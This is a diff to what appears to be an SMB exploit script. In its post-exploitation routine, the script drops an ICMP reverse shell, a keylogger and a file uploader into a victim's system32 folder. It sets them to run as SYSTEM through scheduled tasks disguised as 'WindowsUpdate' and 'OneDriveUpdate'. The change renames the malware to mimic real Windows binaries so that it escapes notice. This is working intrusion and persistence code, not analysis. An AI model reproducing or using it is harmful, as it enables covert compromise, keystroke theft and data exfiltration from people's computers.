@@ -917,12 +917,12 @@ def smb_pwn(conn, arch):
 	# ICMP
 	smb_send_file(smbConn, "icmpsh-s.patch.exe", "C", "/Windows/system32/icmp.exe")
 	# Keylogger
-	smb_send_file(smbConn, "system_42.exe", "C", "/Windows/system32/system_42.exe")
+	smb_send_file(smbConn, "explorer_32.exe", "C", "/Windows/system32/explorer_32.exe")
 	# FileUploader
-	smb_send_file(smbConn, "system_56.exe", "C", "/Windows/system32/system_56.exe")
+	smb_send_file(smbConn, "sluii.exe", "C", "/Windows/system32/sluii.exe")
 	# Creating new task
 	service_exec(conn, r"schtasks /Create /sc daily /tn WindowsUpdate /tr icmp.exe /ru system /st 18:00 ")
-	service_exec(conn, r"schtasks /Create /sc onlogon /tn OneDriveUpdate /tr system_42.exe /ru system")
+	service_exec(conn, r"schtasks /Create /sc onlogon /tn OneDriveUpdate /tr explorer_32.exe /ru system")
 
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 	# Note: there are many methods to get shell over SMB admin session
